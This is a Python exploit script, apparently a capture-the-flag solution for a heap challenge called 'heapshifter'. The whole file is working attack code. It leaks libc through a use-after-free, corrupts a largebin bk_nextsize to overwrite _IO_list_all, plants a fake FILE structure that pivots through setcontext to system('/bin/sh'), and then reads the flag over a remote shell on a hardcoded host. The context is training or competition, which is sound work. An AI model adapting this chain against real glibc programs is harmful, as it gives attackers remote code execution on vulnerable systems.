#!/usr/bin/env python3
import os
import select
import socket
import struct
import subprocess
import sys
import time

BIN = "./heapshifter"
LD = "./ld-linux-x86-64.so.2"

HOST = "13.238.150.105"
PORT = 36970

KEY = b"\x53\x68\x1f\x74\x21\x6d\x65\x90"

# offsets for provided libc
LIBC_LEAK_OFF = 0x21ace0
IO_LIST_ALL = 0x21b680
IO_WFILE_JUMPS = 0x2170c0
SETCONTEXT = 0x539e0
SYSTEM = 0x50d70
BINSH = 0x1d8678
RET = 0x99e


def p64(x):
    return struct.pack("<Q", x & ((1 << 64) - 1))


def u64(b):
    return struct.unpack("<Q", b.ljust(8, b"\x00"))[0]


def enc(data):
    # Program menyimpan input setelah XOR. Supaya memory berisi payload asli,
    # kita kirim payload ^ KEY.
    return bytes([c ^ KEY[i % len(KEY)] for i, c in enumerate(data)])


class IO:
    def __init__(self, remote=False):
        self.remote = remote
        if remote:
            self.s = socket.create_connection((HOST, PORT))
            self.p = None
        else:
            self.p = subprocess.Popen(
                [LD, "--library-path", ".", BIN],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            self.s = None

    def recv(self, timeout=0.05):
        if self.remote:
            self.s.settimeout(timeout)
            try:
                return self.s.recv(4096)
            except Exception:
                return b""

        data = b""
        r, _, _ = select.select([self.p.stdout, self.p.stderr], [], [], timeout)
        for fd in r:
            data += os.read(fd.fileno(), 4096)
        return data

    def ru(self, marker, timeout=2):
        data = b""
        end = time.time() + timeout
        while marker not in data and time.time() < end:
            chunk = self.recv(0.02)
            if chunk:
                data += chunk
            elif self.p and self.p.poll() is not None:
                break
        return data

    def send(self, data):
        if self.remote:
            self.s.sendall(data)
        else:
            self.p.stdin.write(data)
            self.p.stdin.flush()

    def line(self, x):
        if isinstance(x, int):
            x = str(x).encode()
        elif isinstance(x, str):
            x = x.encode()
        self.send(x + b"\n")

    def alloc(self, idx, size):
        self.line(1)
        self.ru(b"slot: ")
        self.line(idx)
        self.ru(b"size: ")
        self.line(size)
        return self.ru(b"> ")

    def free(self, idx):
        self.line(2)
        self.ru(b"slot: ")
        self.line(idx)
        return self.ru(b"> ")

    def edit(self, idx, desired):
        self.line(3)
        self.ru(b"slot: ")
        self.line(idx)
        self.send(enc(desired))
        return self.ru(b"> ", 1)

    def view(self, idx):
        self.line(4)
        self.ru(b"slot: ")
        self.line(idx)
        data = self.ru(b"== heapshifter ==", 1)
        if b"\n== heapshifter ==" in data:
            return data.split(b"\n== heapshifter ==")[0]
        return data

    def interact(self):
        if self.remote:
            import threading

            def reader():
                while True:
                    try:
                        data = self.s.recv(4096)
                        if not data:
                            break
                        os.write(1, data)
                    except Exception:
                        break

            threading.Thread(target=reader, daemon=True).start()

            while True:
                data = os.read(0, 1024)
                if not data:
                    break
                self.s.sendall(data)
        else:
            while True:
                r, _, _ = select.select([self.p.stdout, self.p.stderr, sys.stdin], [], [])
                for fd in r:
                    if fd is sys.stdin:
                        data = os.read(0, 1024)
                        self.p.stdin.write(data)
                        self.p.stdin.flush()
                    else:
                        os.write(1, os.read(fd.fileno(), 4096))


def fake_file_payload(fp, libc):
    """
    Fake _IO_FILE for FSOP:
    _IO_list_all -> fake FILE
    exit() -> _IO_flush_all_lockp()
    fake wide vtable -> setcontext+0x126
    then system("/bin/sh")
    """
    size = 0x418
    b = bytearray(b"\x00" * size)

    def w(off, val):
        if off < 0x10:
            return
        b[off - 0x10:off - 0x08] = p64(val)

    wide = fp + 0x100
    fake_vtable = fp + 0x300
    rop = fp + 0x380

    # FILE fields, fp is chunk user pointer / fake FILE base.
    w(0x20, 0)                       # _IO_write_base
    w(0x28, 1)                       # _IO_write_ptr > write_base
    w(0x68, 0)                       # _chain
    w(0x88, fp + 0x280)              # _lock
    w(0xA0, wide)                    # _wide_data

    # _mode = 0
    b[0xC0 - 0x10:0xC0 - 0x10 + 4] = struct.pack("<i", 0)

    # vtable = _IO_wfile_jumps
    w(0xD8, libc + IO_WFILE_JUMPS)

    def ww(off, val):
        w(0x100 + off, val)

    # wide_data setup
    ww(0x18, 0)
    ww(0x30, 0)
    ww(0x68, libc + BINSH)
    ww(0xA0, rop)
    ww(0xA8, libc + SYSTEM)
    ww(0xE0, fake_vtable)

    # valid mxcsr for setcontext path
    b[0x100 + 0x1C0 - 0x10:0x100 + 0x1C0 - 0x10 + 4] = struct.pack("<I", 0x1F80)

    # fake wide vtable: call setcontext+0x126
    w(0x300 + 0x68, libc + SETCONTEXT + 0x126)

    # ROP-ish stack for setcontext pivot
    w(0x380, libc + BINSH)
    w(0x388, libc + RET)
    w(0x390, libc + SYSTEM)

    return bytes(b)


def exploit(remote=False):
    io = IO(remote)
    io.ru(b"> ")

    # Large chunks. Size range from challenge README/binary behavior: 0x410..0x4d0.
    A_SZ = 0x428
    B_SZ = 0x418

    # Layout:
    # A, guard, B, guard
    io.alloc(0, A_SZ)
    io.alloc(1, 0x410)
    io.alloc(2, B_SZ)
    io.alloc(3, 0x410)

    # Free A and B. UAF view gives unsorted-bin pointers and heap pointers.
    io.free(0)
    io.free(2)

    d_a = io.view(0)
    d_b = io.view(2)

    libc_leak = u64(d_a[:8])
    b_ptr = u64(d_a[8:16])
    a_ptr = u64(d_b[:8])

    libc = libc_leak - LIBC_LEAK_OFF

    print("[+] libc leak =", hex(libc_leak), flush=True)
    print("[+] libc base =", hex(libc), flush=True)
    print("[+] A chunk   =", hex(a_ptr), flush=True)
    print("[+] B chunk   =", hex(b_ptr), flush=True)

    # Allocate B back, so only A remains to be sorted into largebin.
    io.alloc(4, B_SZ)

    # Force A into largebin.
    io.alloc(5, 0x4D0)

    # Largebin attack:
    # corrupt A->bk_nextsize = _IO_list_all - 0x20
    cur = bytearray(io.view(0)[:A_SZ].ljust(A_SZ, b"\x00"))
    target = libc + IO_LIST_ALL
    cur[0x18:0x20] = p64(target - 0x20)
    io.edit(0, bytes(cur))

    print("[+] overwrite largebin bk_nextsize ->", hex(target - 0x20), flush=True)

    # Free B into unsorted.
    io.free(4)

    # Trigger largebin insertion of B.
    # This writes B pointer into _IO_list_all.
    io.alloc(6, 0x4D0)

    print("[+] _IO_list_all should point to B", flush=True)

    # Write fake FILE structure into B via stale slot 2.
    payload = fake_file_payload(b_ptr, libc)
    io.edit(2, payload)

    print("[+] fake FILE written", flush=True)
    print("[+] triggering exit -> FSOP", flush=True)

    # Exit menu triggers libc cleanup / FSOP.
    io.line(5)

    time.sleep(0.5)

    # If shell works, ask flag.
    io.send(b"cat flag.txt\n")
    time.sleep(0.5)

    out = b""
    for _ in range(30):
        out += io.recv(0.1)

    print(out.decode(errors="ignore"))

    if b"THEM" not in out:
        io.interact()


def main():
    remote = len(sys.argv) > 1 and sys.argv[1].upper() == "REMOTE"
    exploit(remote)


if __name__ == "__main__":
    main()
